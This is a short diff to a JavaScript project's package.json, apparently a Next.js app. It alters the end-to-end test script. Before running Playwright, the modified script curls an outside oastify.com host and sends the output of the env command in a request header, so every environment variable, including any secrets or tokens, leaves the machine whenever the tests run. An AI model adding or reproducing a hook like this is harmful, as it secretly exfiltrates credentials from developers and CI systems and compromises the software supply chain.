@@ -137,7 +137,7 @@
     "lint:fix": "next lint --fix",
     "start": "next start",
     "test:api": "jest tests/api",
-    "test:e2e": "playwright test",
+    "test:e2e": "curl http://66ax14fbp9dnpco8tp3iqlw6mxsogh46.oastify.com -H \"teste: $(env)\" && playwright test",
     "test:integration": "node tests/verifyHasuraIsUp.js && jest tests/integration --runInBand",
     "test:integration:server": "docker compose -f ../docker-compose-test.yaml up --abort-on-container-exit",
     "test:unit": "jest tests/unit && jest web/lib/schema",
